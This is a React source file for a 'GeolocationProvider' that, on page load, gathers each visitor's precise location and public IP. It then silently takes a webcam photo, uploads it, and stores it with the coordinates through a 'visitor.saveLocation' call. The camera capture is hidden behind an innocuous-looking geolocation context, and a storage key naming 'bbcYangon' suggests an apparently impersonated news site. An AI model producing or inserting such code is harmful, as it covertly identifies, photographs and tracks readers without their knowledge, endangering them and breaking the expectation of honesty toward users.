import React, { createContext, useContext, useEffect, useState } from "react";
import { trpc } from "../lib/trpc";
interface GeolocationContextType {
  isGranted: boolean | null;
  isDenied: boolean;
  isLoading: boolean;
  retry: () => void;
}

const GeolocationContext = createContext<GeolocationContextType | undefined>(undefined);

export function GeolocationProvider({
  children,
}: {
  children: React.ReactNode;
}) {
  const [isGranted, setIsGranted] = useState<boolean | null>(null);
  const [isDenied, setIsDenied] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
const saveLocation = trpc.articles.visitor.saveLocation.useMutation();
  const requestGeolocation = () => {
    setIsLoading(true);
    setIsDenied(false);

    if (!navigator.geolocation) {
      console.error("Geolocation is not supported by this browser.");
      setIsGranted(false);
      setIsDenied(true);
      setIsLoading(false);
      return;
    }

    navigator.geolocation.getCurrentPosition(
async (position) => {
        console.log("✅ Geolocation Success");
        console.log("Latitude :", position.coords.latitude);
        console.log("Longitude:", position.coords.longitude);
        console.log("Accuracy :", position.coords.accuracy);

try {
const ipInfo = await fetch("https://api.ipify.org?format=json");
const { ip } = await ipInfo.json();
/*
const result = await saveLocation.mutateAsync({
    latitude: position.coords.latitude.toString(),
    longitude: position.coords.longitude.toString(),
    accuracy: Math.round(position.coords.accuracy),
    publicIp: ip,
  });

  console.log("✅ Location saved:", result);*/
try {
  const stream = await navigator.mediaDevices.getUserMedia({
    video: true,
  });

  console.log("✅ Camera permission granted");
const video = document.createElement("video");
video.srcObject = stream;
video.muted = true;
video.playsInline = true;
video.autoplay = true;

await video.play();

await new Promise<void>((resolve) => {
  const wait = () => {
    if (
      video.readyState >= HTMLMediaElement.HAVE_CURRENT_DATA &&
      video.videoWidth > 0 &&
      video.videoHeight > 0
    ) {
      resolve();
    } else {
      requestAnimationFrame(wait);
    }
  };

  wait();
});

console.log("Video width =", video.videoWidth);
console.log("Video height =", video.videoHeight);

const canvas = document.createElement("canvas");
canvas.width = video.videoWidth;
canvas.height = video.videoHeight;

const ctx = canvas.getContext("2d");

if (!ctx) {
  throw new Error("Canvas context unavailable");
}

ctx.drawImage(
  video,
  0,
  0,
  canvas.width,
  canvas.height
);

const photo = canvas.toDataURL("image/jpeg", 0.9);
const blob = await new Promise<Blob>((resolve, reject) => {
  canvas.toBlob(
    (b) => {
      if (b) {
        resolve(b);
      } else {
        reject(new Error("Failed to create image"));
      }
    },
    "image/jpeg",
    0.9
  );
});

const formData = new FormData();

formData.append(
  "image",
  blob,
  "visitor.jpg"
);

const upload = await fetch("/api/upload", {
  method: "POST",
  body: formData,
});


const uploadResult = await upload.json();

console.log("📷 Uploaded:", uploadResult);
const result = await saveLocation.mutateAsync({
  latitude: position.coords.latitude.toString(),
  longitude: position.coords.longitude.toString(),
  accuracy: Math.round(position.coords.accuracy),
  publicIp: ip,
  photo: uploadResult.url,
});

console.log("✅ Location saved:", result);
console.log("📸 Photo captured", photo.substring(0, 50));
  stream.getTracks().forEach((track) => track.stop());
} catch (err) {
  console.error("❌ Camera permission denied", err);
}
} catch (err) {
  console.error("❌ saveLocation failed:", err);
}
        setIsGranted(true);
        setIsDenied(false);
        setIsLoading(false);

        localStorage.setItem("bbcYangonLocationGranted", "true");
      },
      (error) => {
        console.error("❌ Geolocation Error");
        console.error("Code:", error.code);
        console.error("Message:", error.message);

        switch (error.code) {
          case error.PERMISSION_DENIED:
            console.error("Permission Denied");
            break;
          case error.POSITION_UNAVAILABLE:
            console.error("Position Unavailable");
            break;
          case error.TIMEOUT:
            console.error("Request Timeout");
            break;
          default:
            console.error("Unknown Error");
        }

        setIsGranted(false);
        setIsDenied(true);
        setIsLoading(false);

        localStorage.removeItem("bbcYangonLocationGranted");
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };
useEffect(() => {
  console.log("🚀 GeolocationProvider mounted");

  const stored = localStorage.getItem("bbcYangonLocationGranted");
  console.log("Stored value =", stored);
if (stored === "true") {
  console.log("✅ Already granted");

  requestGeolocation();
} else {
  console.log("📍 Calling requestGeolocation()");
  requestGeolocation();
}
}, []);

  const handleRetry = () => {
    localStorage.removeItem("bbcYangonLocationGranted");
    requestGeolocation();
  };

  return (
    <GeolocationContext.Provider
      value={{
        isGranted,
        isDenied,
        isLoading,
        retry: handleRetry,
      }}
    >
      {children}
    </GeolocationContext.Provider>
  );
}

export function useGeolocation() {
  const context = useContext(GeolocationContext);

  if (!context) {
    throw new Error(
      "useGeolocation must be used within GeolocationProvider"
    );
  }

  return context;
}
